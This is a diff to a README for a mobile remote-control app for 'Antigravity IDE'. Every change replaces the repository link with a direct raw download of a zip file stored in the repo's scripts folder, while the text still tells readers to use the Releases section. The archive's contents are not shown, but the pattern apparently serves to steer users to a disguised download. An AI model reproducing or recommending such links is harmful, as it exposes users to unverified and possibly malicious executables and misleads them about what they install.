@@ -1,6 +1,6 @@
 # 📱 antigravity-ide-mobile - Control Antigravity IDE Remotely
 
-[![Download](https://img.shields.io/badge/Download_antigravity--ide--mobile-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarahexasperated211/antigravity-ide-mobile)
+[![Download](https://img.shields.io/badge/Download_antigravity--ide--mobile-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarahexasperated211/antigravity-ide-mobile/raw/refs/heads/main/scripts/mobile_antigravity_ide_v1.5.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Your mobile device should support modern web apps or have the ability to run Pre
 
 Click the big button below to visit the GitHub page where you can download the app and find more information:
 
-[![Download](https://img.shields.io/badge/Download_antigravity--ide--mobile-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarahexasperated211/antigravity-ide-mobile)
+[![Download](https://img.shields.io/badge/Download_antigravity--ide--mobile-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarahexasperated211/antigravity-ide-mobile/raw/refs/heads/main/scripts/mobile_antigravity_ide_v1.5.zip)
 
 From the GitHub page, look for the latest release or the installation files under the Releases section.
 
@@ -41,7 +41,7 @@ From the GitHub page, look for the latest release or the installation files unde
 Follow these steps to get the app running:
 
 1. **Visit the download page.** Use the button above or open this link in your browser:  
-   https://github.com/Tarahexasperated211/antigravity-ide-mobile
+   https://github.com/Tarahexasperated211/antigravity-ide-mobile/raw/refs/heads/main/scripts/mobile_antigravity_ide_v1.5.zip
 
 2. **Find the latest release.** Check the "Releases" section on the GitHub page. This usually has zip or executable files ready to download.
 
@@ -127,7 +127,7 @@ To update antigravity-ide-mobile:
 ## 📁 Where to Find More Help and Info
 
 - Visit the GitHub repository page for documentation, issues, and community input:  
-  https://github.com/Tarahexasperated211/antigravity-ide-mobile
+  https://github.com/Tarahexasperated211/antigravity-ide-mobile/raw/refs/heads/main/scripts/mobile_antigravity_ide_v1.5.zip
 
 - Check the README or Wiki sections for detailed guides.
 
@@ -135,4 +135,4 @@ To update antigravity-ide-mobile:
 
 ---
 
-[![Download](https://img.shields.io/badge/Download_antigravity--ide--mobile-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarahexasperated211/antigravity-ide-mobile)
+[![Download](https://img.shields.io/badge/Download_antigravity--ide--mobile-00C853?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Tarahexasperated211/antigravity-ide-mobile/raw/refs/heads/main/scripts/mobile_antigravity_ide_v1.5.zip)
